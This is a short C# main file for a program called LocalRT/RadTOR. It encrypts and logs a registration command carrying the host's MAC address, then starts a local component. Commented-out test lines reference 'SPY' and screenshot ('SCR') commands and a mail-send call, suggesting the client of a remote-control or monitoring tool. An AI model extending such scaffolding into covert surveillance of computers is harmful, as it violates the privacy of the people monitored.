using LocalRT.radtor.local;
using LocalRT.radtor.local.core;
using LocalRT.radtor.utils;
using LocalRT.Radtor.Remote;
using Microsoft.Win32;
using System;

namespace LocalRT
{
    static class RTMain
    {
        private static object RadtorUtil;

        static void Main()
        {
            String cmd = "ADD!"+LocalConfiguration.getMac()+"!" + "localhost"; //+ LocalConfiguration.getMac();
            EncripTOR encrip = new EncripTOR();
            #region TEST_ENCRIPT
            ////String cmd = "la Pagina que andas buscando es http://www.google.cl o no es asi?";
            //String cmd = "ADD!"+LocalConfiguration.getMac()+"!" + "localhost"; //+ LocalConfiguration.getMac();
            ////String cmd = "SPY#/#" + "localhost"; //+ LocalConfiguration.getMac();

            //cmd = encrip.encript(cmd);
            //RadTorLog.log(cmd);
            //cmd = encrip.decrypt(cmd);
            //RadTorLog.log(cmd);

            //cmd = "SCR#%tmp%\\ok.tmp#" + LocalConfiguration.getMac();
            //encrip = new EncripTOR();
            //cmd = encrip.encript(cmd);
            //RadTorLog.log(cmd);
            //cmd = encrip.decrypt(cmd);
            //RadTorLog.log(cmd);
            #endregion
            //RadTorLog.log(cmd);
            encrip = new EncripTOR();
            cmd = encrip.encript(cmd);
            RadTorLog.log(cmd);

            //RTMail.Send("yeah");

            RadTORLocal rtLocal = new RadTORLocal();
            rtLocal.run();
        }
    }
}
